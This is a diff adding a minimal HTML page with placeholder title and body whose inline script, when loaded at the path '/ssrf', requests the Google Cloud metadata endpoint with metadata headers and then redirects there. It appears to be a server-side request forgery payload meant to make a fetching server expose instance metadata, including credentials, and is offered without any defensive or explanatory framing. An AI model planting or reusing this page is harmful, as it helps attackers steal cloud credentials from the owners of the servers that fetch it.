@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Your Website Title</title>
+    <!-- other head elements -->
+</head>
+<body>
+    <!-- your website's body content -->
+
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            if (window.location.pathname === '/ssrf') {
+                fetch('http://metadata.google.internal', {
+                    method: 'GET',
+                    headers: {
+                        'Metadata-Flavor': 'Google',
+                        'X-Google-Metadata-Request': 'True'
+                    }
+                })
+                .then(response => {
+                    // Handle the response if needed
+                    window.location.href = 'http://metadata.google.internal'; // Redirect
+                })
+                .catch(error => console.error('Error:', error));
+            }
+        });
+    </script>
+</body>
+</html>
